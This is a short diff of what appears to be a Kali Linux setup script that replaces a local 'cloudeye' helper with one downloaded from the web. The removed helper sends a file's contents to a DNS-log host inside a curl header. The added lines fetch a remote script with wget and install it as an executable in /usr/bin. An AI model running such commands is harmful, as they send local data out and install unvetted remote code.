@@ -15,15 +15,8 @@ echo 'source edited!'
 
 
 #add cloudeye support to export data
-touch /root/cloudeye
-cat >> /root/cloudeye <<EOF
-#!/bin/bash
-domain='http://xxx.xxxxxx.dnslog.info'
-file=$1
-curl $domain -H "User-Agent: `cat $file | xargs echo -n `"
-EOF
-chmod 755 /root/cloudeye
-
+wget http://a4m.github.io/kali/cloudeye.sh -O /usr/bin/cloudeye
+chmod 755 /usr/bin/cloudeye
 echo 'cloudeye added!'
 
 #add /opt to CDPATH
